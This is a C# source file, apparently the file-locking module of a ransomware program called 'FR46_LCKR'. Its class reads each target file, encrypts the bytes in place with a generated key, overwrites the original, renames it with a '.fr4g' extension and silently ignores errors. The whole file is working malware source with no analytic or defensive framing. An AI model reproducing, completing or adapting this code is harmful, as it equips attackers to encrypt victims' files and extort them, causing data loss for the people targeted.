using System;
using System.IO;
namespace FR46_LCKR
{
    internal class Fil_Parsr : IFil_Parsr
    {
        private IFil_Crypt Fil_Crypt;
        private byte[] KB;

        // Encryption function
        public Fil_Parsr(IFil_Crypt fil_Crypt)
        {
            Fil_Crypt = fil_Crypt;
            KB = Fil_Crypt.CreateEncryptionKey();
        }

        //Parse through files and rename to .fr4g
        public void Par_File(string fPath)
        {
            var fBytes = Get_FBytes(fPath);
            var encryptedFBytes = Fil_Crypt.EncryptBytes(fBytes, KB);
            Wrt_FBytes(fPath, encryptedFBytes);

            var fExt = Path.GetExtension(fPath);
            var newFPath = fPath.Replace(fExt, ".fr4g");

            try
            {
                File.Move(fPath, newFPath);
            }
            catch
            {
            }
            GC.Collect();
        }

        //Read file in byte array
        public byte[] Get_FBytes(string fPath)
        {
            using (var fStream = File.OpenRead(fPath))
            {
                var fBytes = new byte[fStream.Length];
                try
                {
                    fStream.Read(fBytes, 0, Convert.ToInt32(fStream.Length));
                    fStream.Close();

                    return fBytes;
                }

                finally
                {
                    fStream.Close();
                }
            }
        }

        //Writes File Bytes to path

        public void Wrt_FBytes(string fPath, byte[] fBytes)
        {
            using (var fStream = File.OpenWrite(fPath))
            {
                if (fStream.CanWrite)
                {
                    fStream.Write(fBytes, 0, Convert.ToInt32(fBytes.Length));
                }
            }
        }
    }
}
